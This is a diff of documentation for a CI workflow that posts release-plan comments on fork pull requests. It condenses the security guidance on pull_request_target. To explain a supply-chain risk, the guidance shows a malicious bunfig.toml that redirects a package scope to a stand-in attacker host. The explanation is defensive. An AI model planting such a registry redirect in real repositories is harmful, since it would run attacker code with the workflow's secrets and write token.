@@ -18,7 +18,7 @@ These commands facilitate the following:
 
 ## PR check workflow
 
-Posts/updates the release-plan comment on every PR, including PRs from forks. The pattern below is deliberately structured so that **no part of the PR's tree can influence how bumpy is fetched or run** — read the security note after the example before adapting it.
+Posts/updates the release-plan comment on every PR, including PRs from forks. **Copy it as-is and you're covered** — it's structured so nothing in a fork PR can influence how bumpy is fetched or run. (If you change `main` to your own base branch, that's the only edit most repos need. See the security notes below before restructuring it.)
 
 ```yaml
 # .github/workflows/bumpy-check.yaml
@@ -34,19 +34,16 @@ jobs:
   check:
     runs-on: ubuntu-latest
     steps:
-      # 1. TRUSTED checkout of the base branch into the default workspace.
-      #    bumpy is fetched and executed from HERE, so the package-manager
-      #    config that governs resolution (bunfig.toml, .npmrc) is YOUR code.
-      #    Hardcoded to "main" — the PR controls its own base ref, so don't use
-      #    github.event.pull_request.base.ref. Change "main" to your base branch.
+      # 1. TRUSTED checkout of the base branch — bumpy is fetched and run from
+      #    here, so the package-manager config in effect (bunfig.toml, .npmrc)
+      #    is YOURS, not the PR's. Hardcoded "main" (the PR controls its own
+      #    base ref); change it to your base branch.
       - uses: actions/checkout@v6
         with:
           ref: main
           persist-credentials: false
 
-      # 2. UNTRUSTED checkout of the PR head into ./pr. We only READ files from
-      #    here (bump files, config, package.json) — never resolve, install, or
-      #    run anything out of this tree.
+      # 2. UNTRUSTED PR head into ./pr — only READ from here, never run it.
       - uses: actions/checkout@v6
         with:
           ref: ${{ github.event.pull_request.head.sha }}
@@ -55,36 +52,32 @@ jobs:
 
       - uses: oven-sh/setup-bun@v2
 
-      # ⚠️ DO NOT INSTALL DEPS OR EXECUTE CODE FROM ./pr ⚠️
+      # ⚠️ DO NOT bun install / npm install / run any script from ./pr ⚠️
 
-      # Resolve bumpy's version from the TRUSTED base checkout (workspace root),
-      # never from ./pr — a fork PR must not be able to choose the bumpy version.
+      # Read bumpy's version from the TRUSTED base checkout, never from ./pr.
       - name: Resolve bumpy version from base
         run: |
           VERSION=$(jq -r '.devDependencies["@varlock/bumpy"] // .dependencies["@varlock/bumpy"]' package.json | sed 's/[\^~]//')
           echo "BUMPY_VERSION=$VERSION" >> "$GITHUB_ENV"
 
-      # bunx runs from the workspace root (the trusted base checkout), so it
-      # reads the base's bunfig.toml/.npmrc — the PR's copies in ./pr can't
-      # redirect where bumpy is downloaded from. `--cwd ./pr` then points bumpy
-      # at the PR tree to read its bump files. Quote the version arg so a
-      # malformed value can't shell-inject.
+      # bunx runs from the trusted root; `--cwd ./pr` only points bumpy at the
+      # PR tree to read its bump files. Quote the version arg against injection.
       - run: bunx "@varlock/bumpy@$BUMPY_VERSION" ci check --cwd ./pr
         env:
           GH_TOKEN: ${{ github.token }}
 ```
 
-### ⚠️ Security: the real threat is resolution, not just scripts
+### ⚠️ Security essentials
 
-`pull_request_target` runs with write permissions and access to secrets — even on fork PRs. That's what lets us post comments on PRs from forks, but it means the workflow must never let a PR author influence what executes. There are **two** levels to this, and the second is the one that's easy to miss:
+`pull_request_target` carries a **write token and secrets even on fork PRs** — that's what lets it comment on forks, and why a PR author must never be able to influence what runs. The workflow above handles this; two rules to preserve if you adapt it:
 
-**1. Don't run PR code directly.** The obvious rules:
+- **Never execute PR code** — no `bun install` / `npm install` (postinstall scripts run), no `bun run <script>` / `npm test`, no building from the PR tree.
+- **Fetch and run bumpy from the trusted base checkout; only _read_ the PR tree** via `--cwd ./pr`. Keep `persist-credentials: false` on both checkouts.
 
-- **No `bun install` / `npm install`** — postinstall scripts execute as PR code, and a malicious PR can add or modify dependencies.
-- **No `bun run <script>` / `npm test`** — the script body comes from the PR's `package.json`.
-- **No building from the PR tree** — same problem.
+<details>
+<summary><strong>Why two checkouts? The registry-redirect attack (worth reading before you restructure this)</strong></summary>
 
-**2. Don't let the PR tree control how bumpy itself is fetched.** This is the subtle one. Running `bunx @varlock/bumpy@<version>` reads package-manager config — `bunfig.toml` and `.npmrc` — **from the current working directory**. A fork PR can commit a `bunfig.toml` or `.npmrc` that redirects the `@varlock` scope (or the whole registry) to an attacker-controlled server:
+The non-obvious risk isn't just running PR scripts — it's **how bumpy itself gets fetched**. Running `bunx @varlock/bumpy@<version>` reads package-manager config (`bunfig.toml`, `.npmrc`) **from the current working directory**. A fork PR can commit one that redirects the `@varlock` scope (or the whole registry) to its own server:
 
 ```toml
 # bunfig.toml committed in a malicious PR
@@ -92,29 +85,34 @@ jobs:
 "@varlock" = { url = "https://evil.example/" }
 ```
 
-If `bunx` runs with the PR checkout as its working directory, it downloads _the attacker's_ `@varlock/bumpy@<version>` — at the exact version you pinned — and executes its bin with your write token and secrets in scope. **Pinning the version does nothing here; the version is honored, only the source is swapped.** The same applies to `npx`/`pnpm`/`yarn`.
+If `bunx` runs with the PR checkout as its working directory, it downloads _the attacker's_ `@varlock/bumpy` — at the exact version you pinned — and executes its bin with your write token and secrets in scope. **Pinning the version is no defense; the version is honored, only the source is swapped.** Same for `npx`/`pnpm`/`yarn`.
 
-The workflow above closes this by **separating where bumpy is fetched from what bumpy reads**:
+The two-checkout layout closes this by **separating where bumpy is fetched from what bumpy reads**:
 
-- bumpy is resolved and run from the **trusted base checkout** (workspace root), so the `bunfig.toml`/`.npmrc` in effect are yours, not the PR's.
-- `--cwd ./pr` points the already-running bumpy process at the PR tree. By then the binary is already fetched — config files sitting in `./pr` are never consulted by a package manager. `bumpy ci check` only reads files (markdown bump files, JSON config, `package.json`) and shells out to `git`/`gh`, so it's safe to aim at untrusted source.
-- `persist-credentials: false` on both checkouts is defense in depth: it keeps the workflow token out of the on-disk `.git/config` that lives next to untrusted code.
+- bumpy is resolved and run from the **trusted base checkout**, so the `bunfig.toml`/`.npmrc` in effect are yours, not the PR's.
+- `--cwd ./pr` points the already-running bumpy process at the PR tree. The binary is already fetched by then — config in `./pr` is never consulted by a package manager. `bumpy ci check` only reads files and shells out to `git`/`gh`, so it's safe to aim at untrusted source.
+- `persist-credentials: false` keeps the workflow token out of the on-disk `.git/config` sitting next to untrusted code.
 
-> **Single-checkout shortcut (not recommended).** You may see examples that check out the PR head into the workspace root and run `bunx … --cwd .` from there. Don't — that puts the PR's `bunfig.toml`/`.npmrc` in `bunx`'s working directory and reopens the registry-redirect hole. The point of the two-checkout layout is precisely that `bunx`'s working directory is trusted.
+**Don't use the single-checkout shortcut.** Checking out the PR head into the workspace root and running `bunx … --cwd .` reopens the hole — that puts the PR's `bunfig.toml`/`.npmrc` back in `bunx`'s working directory. The whole point is that `bunx`'s working directory is trusted.
 
-### How the bumpy version stays in sync
+</details>
 
-`jq … package.json` reads bumpy's version from the **base checkout** (i.e. `main`) at workflow runtime. That means:
+<details>
+<summary>How the bumpy version stays in sync (and what to adjust for your setup)</summary>
+
+`jq … package.json` reads bumpy's version from the **base checkout** (`main`) at workflow runtime, so:
 
 - **No version pinned in the workflow file** — Renovate/Dependabot bumps to `package.json` flow through automatically.
-- **Fork PRs can't swap the bumpy version** — the source of truth is `main`, which they don't control, and we read it from the trusted root checkout (never from `./pr`).
+- **Fork PRs can't swap the bumpy version** — the source of truth is `main`, read from the trusted root checkout (never from `./pr`).
 
-A few things to adjust if your setup is different:
+Adjust if your setup differs:
 
-- If your default branch isn't `main`, change the `ref: main` in the first checkout to your base branch.
-- If `@varlock/bumpy` lives somewhere other than root `package.json` (e.g. a sub-package), point the `jq` path at that file instead.
+- Default branch isn't `main`? Change the `ref: main` in the first checkout to your base branch.
+- `@varlock/bumpy` lives somewhere other than root `package.json` (e.g. a sub-package)? Point the `jq` path at that file.
 
-You can also pin the bumpy version directly in the workflow (`bunx @varlock/bumpy@1.2.3 ci check --cwd ./pr`), but we prefer a single source of truth.
+You can also pin the version directly (`bunx @varlock/bumpy@1.2.3 ci check --cwd ./pr`), but we prefer a single source of truth.
+
+</details>
 
 ### Don't need fork PR support?
 
